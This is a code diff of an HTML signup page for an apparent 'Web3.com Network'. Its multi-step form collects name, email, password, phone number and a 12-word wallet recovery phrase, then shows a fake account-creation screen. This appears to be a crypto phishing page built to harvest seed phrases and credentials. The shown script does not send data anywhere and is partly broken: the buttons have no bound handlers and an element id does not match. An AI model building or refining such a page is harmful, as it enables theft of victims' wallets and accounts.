@@ -1,99 +1,208 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Web3.com Network | Sign Up</title>
-  <link rel="stylesheet" href="style.css">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background: #0b0f19;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 420px;
+      padding: 30px;
+      background: #11162a;
+      border-radius: 12px;
+    }
+
+    h1 {
+      text-align: center;
+      margin-bottom: 5px;
+    }
+
+    p.subtitle {
+      text-align: center;
+      font-size: 14px;
+      color: #aaa;
+      margin-bottom: 25px;
+    }
+
+    .step {
+      display: none;
+    }
+
+    .step.active {
+      display: block;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 14px;
+      margin-top: 15px;
+      border-radius: 8px;
+      border: none;
+      font-size: 16px;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 25px;
+    }
+
+    button {
+      padding: 12px 20px;
+      border: none;
+      border-radius: 8px;
+      background: #4f7cff;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button.secondary {
+      background: #333;
+    }
+
+    .loading {
+      display: none;
+      text-align: center;
+      margin-top: 30px;
+    }
+  </style>
 </head>
 <body>
 
-<div class="auth-container">
-
+<div class="container">
   <h1>Web3.com</h1>
-  <h3>(NETWORK)</h3>
+  <p class="subtitle">(Network)</p>
 
-  <p class="tagline">
-    CONNECT YOUR CRYPTO ASSETS TO A SAFE NETWORK.<br><br>
-  </p>
+  <form id="signupForm">
 
-  <form id="multiStepForm">
-
-    <!-- STEP 1 -->
- <div class="step active">
-    <h2>Enter your full name</h2>
-    <input type="text" id="name" required>
-    <button type="button" onclick="nextStep()">Next</button>
+  <!-- STEP 1: NAME -->
+  <div class="step active">
+    <h3>Enter your full name</h3>
+    <input type="text" id="name" required />
+    <button type="button" class="next-btn">Next</button>
   </div>
 
-    <!-- STEP 2 -->
-    <div class="step">
-       <h2>Email address</h2>
-      <input type="email" placeholder="Email Address" required>
-  <button onclick="prevStep()">Back</button>
-  <button onclick="nextStep()">Next</button>
-</div>
-
-    <!-- STEP 3 -->
-     <div class="step">
-        <h2>Create password</h2>
-       <input type="password" id="password" required>
-  <button type="button" onclick="prevStep()">Back</button>
-  <button type="button" onclick="nextStep()">Next</button>
-</div>
-
-    <!-- STEP 4 -->
-    <div class="step">
-       <h2>Phone Number</h2>
-      <input type="tel" placeholder="Phone Number" required>
-  <button onclick="prevStep()">Back</button>
-  <button onclick="nextStep()">Next</button>
-</div>
-
-    <!-- STEP 5 -->
-    <div class="step">
-      <h2>Phrase keys (12 words)</h2>
-      <div class="grid-words">
-        <input><input><input><input>
-        <input><input><input><input>
-        <input><input><input><input>
-      </div>
-      <div class="btn-row">
-  <button onclick="prevStep()">Back</button>
-  <button onclick="nextStep()">Next</button>
-</div>
-
-   <!-- STEP 6 -->
-   <div class="step">
-  <h3>Select Wallet Type</h3>
-
-  <select required>
-    <option value="">-- Choose wallet --</option>
-    <option>MetaMask</option>
-    <option>Trust Wallet</option>
-    <option>Coinbase Wallet</option>
-    <option>BNB Chain</option>
-    <option>Solana</option>
-    <option>WalletConnect</option>
-  </select>
-
-  <div class="buttons">
-    <button type="button" onclick="prevStep()">Back</button>
-    <button type="submit">Create Account</button>
+  <!-- STEP 2: EMAIL -->
+  <div class="step">
+    <h3>Enter your email</h3>
+    <input type="email" id="email" required />
+    <div class="nav-btns">
+      <button type="button" class="back-btn">Back</button>
+      <button type="button" class="next-btn">Next</button>
+    </div>
   </div>
-</div> 
 
+  <!-- STEP 3: PASSWORD -->
+  <div class="step">
+    <h3>Create a password</h3>
+    <input type="password" id="password" required />
+    <div class="nav-btns">
+      <button type="button" class="back-btn">Back</button>
+      <button type="button" class="next-btn">Next</button>
+    </div>
+  </div>
 
-<div id="loadingScreen" style="display:none;">
-  <h2>Please hold on</h2>
-  <p>Your account is being created...</p>
+  <!-- STEP 4: PHONE -->
+  <div class="step">
+    <h3>Phone number</h3>
+    <input type="tel" id="phone" required />
+    <div class="nav-btns">
+      <button type="button" class="back-btn">Back</button>
+      <button type="button" class="next-btn">Next</button>
+    </div>
+  </div>
+
+  <!-- STEP 5: Phrase Key (12 BOXES) -->
+  <div class="step">
+    <h3>Phrase Key</h3></h3>
+    <div class="security-grid">
+      <input /><input /><input /><input />
+      <input /><input /><input /><input />
+      <input /><input /><input /><input />
+    </div>
+    <div class="nav-btns">
+      <button type="button" class="back-btn">Back</button>
+      <button type="button" class="next-btn">Next</button>
+    </div>
+  </div>
+
+  <!-- STEP 6: WALLET TYPE -->
+  <div class="step">
+    <h3>Select wallet type</h3>
+    <select id="walletType" required>
+      <option value="">Choose one</option>
+      <option>Ethereum</option>
+      <option>Solana</option>
+      <option>Bitcoin</option>
+      <option>BNB Chain</option>
+      <option>Polygon</option>
+    </select>
+
+    <div class="nav-btns">
+      <button type="button" class="back-btn">Back</button>
+      <button type="submit" class="create-btn">Create Account</button>
+    </div>
+  </div>
+
+</form>
+
+<!-- LOADING SCREEN (HIDDEN BY DEFAULT) -->
+<div id="loadingScreen">
+  <div class="loader"></div>
+  <p>Please hold on, your account is being created…</p>
 </div>
-  <p class="switch">
-    Already have an account? <a href="login.html">Login</a>
-  </p>
 
-</div>
+<script>
+  let currentStep = 0;
+  const steps = document.querySelectorAll(".step");
+  const form = document.getElementById("signupForm");
+  const loading = document.getElementById("loading");
 
-<script src="script.js"></script>
+  function showStep(index) {
+    steps.forEach((step, i) => {
+      step.classList.toggle("active", i === index);
+    });
+  }
+
+  function nextStep() {
+    if (currentStep < steps.length - 1) {
+      currentStep++;
+      showStep(currentStep);
+    } else {
+      form.style.display = "none";
+      loading.style.display = "block";
+
+      setTimeout(() => {
+        window.location.href = "dashboard.html";
+      }, 2000);
+    }
+  }
+
+  function prevStep() {
+    if (currentStep > 0) {
+      currentStep--;
+      showStep(currentStep);
+    }
+  }
+</script>
+
 </body>
 </html>
